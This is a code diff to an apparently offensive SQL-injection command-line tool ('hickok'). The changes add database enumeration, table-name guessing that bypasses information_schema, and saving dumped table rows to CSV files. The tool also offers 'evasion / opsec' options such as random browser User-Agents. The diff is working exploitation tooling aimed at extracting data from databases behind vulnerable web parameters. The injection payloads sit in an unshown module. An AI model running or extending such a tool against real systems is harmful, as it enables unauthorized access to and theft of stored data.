@@ -182,9 +182,9 @@ def cmd_eights(args) -> None:
 
 _SQL_HELP = """  walk the database (boolean-blind):
   banner                DBMS version       user / db        current user / database
-  tables                list tables        columns <table>  list a table's columns
-  dump <table>          dump its rows      query "<SELECT>"  extract one value
-  help                  this               exit             quit
+  databases             list databases     tables           list tables
+  columns <table>       a table's columns  dump <table>     dump its rows
+  query "<SELECT>"      extract one value  help / exit      this / quit
 """
 
 
@@ -326,8 +326,11 @@ def cmd_sql(args) -> None:
                 cols, rows = _walk_dump(oracle, prof, union, args.dump, console=c)
                 rows = list(rows)                                # extract inside the spinner
             _print_table(c, cols, rows)
+            _save_dump(c, oracle, args.dump, cols, rows, args.output)
         else:
-            _sql_repl(c, oracle, prof, union)
+            with c.working("reading the databases", lambda: oracle.count):
+                _overview(c, oracle, prof, union)    # exploration context — REPL only
+            _sql_repl(c, oracle, prof, union, args.output)
     finally:
         oracle.cache.close()
 
@@ -343,6 +346,33 @@ def _walk_scalar(oracle, prof, union, expr):
     if union:
         return sqli.union_value(oracle.http, oracle, *union, expr)
     return sqli.extract_str(oracle, prof, expr)
+
+
+def _databases(oracle, prof, union):
+    if union:
+        return sqli.union_databases(oracle.http, oracle, *union)
+    return sqli.databases(oracle, prof)
+
+
+def _overview(c, oracle, prof, union) -> None:
+    """Right under the DBMS: the current database, and the others when the catalog
+    is reachable — a starting point for where to dig."""
+    try:
+        cur = (_walk_scalar(oracle, prof, union, prof["db"]) or "").strip()
+    except Exception:
+        cur = ""
+    dbs = []
+    if union:                       # cheap (one request) — only auto-list when reflected
+        try:
+            dbs = [d for d in _databases(oracle, prof, union) if d]
+        except Exception:
+            dbs = []
+    if dbs:
+        shown = ", ".join(f"{d} *" if d == cur else d for d in dbs)
+        tail = "    (* current)" if cur in dbs else ""
+        c.good(f"databases ({len(dbs)}): {shown}{tail}")
+    elif cur:
+        c.good(f"database: {cur}")
 
 
 def _walk_tables(oracle, prof, union):
@@ -363,7 +393,14 @@ def _tables(c, oracle, prof, union):
                "response(s); falling back to common table names")
     else:
         c.info("catalog returned nothing — trying common table names")
-    tbls = list(sqli.common_tables(oracle))
+    db = None
+    try:                                    # the db name lets us also try <db>_<name>
+        db = (_walk_scalar(oracle, prof, union, prof["db"]) or "").strip() or None
+    except Exception:
+        pass
+    if db:
+        c.info(f"guessing names against the '{db}' database (and <db>_* conventions)")
+    tbls = list(sqli.common_tables(oracle, db=db))
     if tbls:
         c.good(f"{len(tbls)} table(s) found by name (information_schema bypassed)")
     else:
@@ -399,6 +436,18 @@ def _walk_dump(oracle, prof, union, table, console=None):
     return cols, rows
 
 
+def _save_dump(c, oracle, table, cols, rows, out_dir=None) -> None:
+    """Persist a dump to CSV and tell the user where — so the data survives the
+    session instead of only scrolling past in the terminal."""
+    if not rows:
+        return
+    path = sqlcache.save_dump(oracle.url, oracle.param, table, cols, rows, out_dir)
+    if path:
+        c.good(f"{len(rows)} row(s) saved → {path}")
+    else:
+        c.warn(f"couldn't write the dump to {out_dir or sqlcache.runs_dir()}")
+
+
 def _print_table(c, cols, rows) -> None:
     widths = [max(len(cols[i]), *(len(r[i]) for r in rows)) if rows else len(cols[i])
               for i in range(len(cols))]
@@ -408,7 +457,7 @@ def _print_table(c, cols, rows) -> None:
         c.plain("  " + " | ".join(v.ljust(widths[i]) for i, v in enumerate(r)))
 
 
-def _sql_repl(c, oracle, prof, union) -> None:
+def _sql_repl(c, oracle, prof, union, out_dir=None) -> None:
     c.plain(_SQL_HELP)
     while True:
         try:
@@ -434,7 +483,14 @@ def _sql_repl(c, oracle, prof, union) -> None:
             elif cmd in ("user", "current-user"):
                 c.good(_walk_scalar(oracle, prof, union, prof["user"]) or "(n/a)")
             elif cmd in ("db", "current-db"):
-                c.good(_walk_scalar(oracle, prof, union, prof["db"]))
+                c.good(_walk_scalar(oracle, prof, union, prof["db"]) or "(n/a)")
+            elif cmd in ("databases", "dbs"):
+                dbs = [d for d in _databases(oracle, prof, union) if d]
+                if dbs:
+                    for d in dbs:
+                        c.plain(f"  {d}")
+                else:                       # catalog filtered — show at least the current one
+                    c.good(_walk_scalar(oracle, prof, union, prof["db"]) or "(n/a)")
             elif cmd == "tables":
                 for t in _tables(c, oracle, prof, union):
                     c.plain(f"  {t}")
@@ -455,6 +511,7 @@ def _sql_repl(c, oracle, prof, union) -> None:
                         rows.append(r)
                 finally:
                     _print_table(c, cols, rows)   # show whatever we pulled, even on interrupt
+                    _save_dump(c, oracle, arg, cols, rows, out_dir)
             elif cmd == "query":
                 if not arg:
                     c.warn('usage: query "<SELECT returning one value>"')
@@ -532,6 +589,8 @@ def build_parser() -> argparse.ArgumentParser:
                     help="-v 2 prints every injected payload")
     sq.add_argument("--fresh", action="store_true",
                     help="ignore the cached values for this target and re-extract from scratch")
+    sq.add_argument("-o", "--output", metavar="DIR",
+                    help="directory to write dumped CSVs to (default: ~/.local/share/hickok/sql/dumps)")
     ev = sq.add_argument_group("evasion / opsec")
     ev.add_argument("--random-agent", action="store_true", help="use a random real browser User-Agent")
     ev.add_argument("-A", "--user-agent", metavar="UA", help="explicit User-Agent")
